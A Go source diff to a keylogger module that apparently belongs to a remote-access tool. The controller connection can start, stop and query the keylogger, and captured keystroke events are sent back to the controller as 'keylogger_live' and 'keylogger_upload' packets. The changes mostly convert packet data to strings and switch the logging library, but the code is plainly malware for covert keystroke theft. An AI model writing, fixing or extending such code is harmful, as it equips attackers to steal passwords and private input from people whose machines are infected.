@@ -7,6 +7,8 @@ import (
 	"encoding/json"
 	"sync"
 	"time"
+
+	"github.com/kataras/golog"
 )
 
 // KeyEvent represents a single keystroke event
@@ -111,7 +113,7 @@ func (k *Keylogger) sendLiveEvent(event KeyEvent) {
 
 	packet := modules.Packet{
 		Act:  "keylogger_live",
-		Data: data,
+		Data: string(data),
 	}
 
 	k.conn.SendPack(packet)
@@ -137,7 +139,7 @@ func (k *Keylogger) uploadEvents() {
 
 	packet := modules.Packet{
 		Act:  "keylogger_upload",
-		Data: data,
+		Data: string(data),
 	}
 
 	k.conn.SendPack(packet)
@@ -174,31 +176,31 @@ func HandleAction(conn *common.Conn, packet modules.Packet) {
 	switch packet.Act {
 	case "keylogger_start":
 		var config KeyloggerConfig
-		if err := json.Unmarshal(packet.Data, &config); err != nil {
-			utils.Error("Keylogger", "Failed to parse config: %v", err)
+		if err := json.Unmarshal([]byte(packet.Data.(string)), &config); err != nil {
+			golog.Error("Keylogger: Failed to parse config: ", err)
 			return
 		}
 		
 		err := keylogger.Start(config)
 		if err != nil {
-			utils.Error("Keylogger", "Failed to start: %v", err)
+			golog.Error("Keylogger: Failed to start: ", err)
 			conn.SendPack(modules.Packet{
 				Act:  "keylogger_error",
-				Data: []byte(err.Error()),
+				Data: err.Error(),
 			})
 			return
 		}
 
 		conn.SendPack(modules.Packet{
 			Act:  "keylogger_started",
-			Data: []byte("Keylogger started successfully"),
+			Data: "Keylogger started successfully",
 		})
 
 	case "keylogger_stop":
 		keylogger.Stop()
 		conn.SendPack(modules.Packet{
-			Act:  "keylogger_stopped", 
-			Data: []byte("Keylogger stopped successfully"),
+			Act:  "keylogger_stopped",
+			Data: "Keylogger stopped successfully",
 		})
 
 	case "keylogger_status":
@@ -210,7 +212,7 @@ func HandleAction(conn *common.Conn, packet modules.Packet) {
 		data, _ := json.Marshal(status)
 		conn.SendPack(modules.Packet{
 			Act:  "keylogger_status",
-			Data: data,
+			Data: string(data),
 		})
 	}
 }
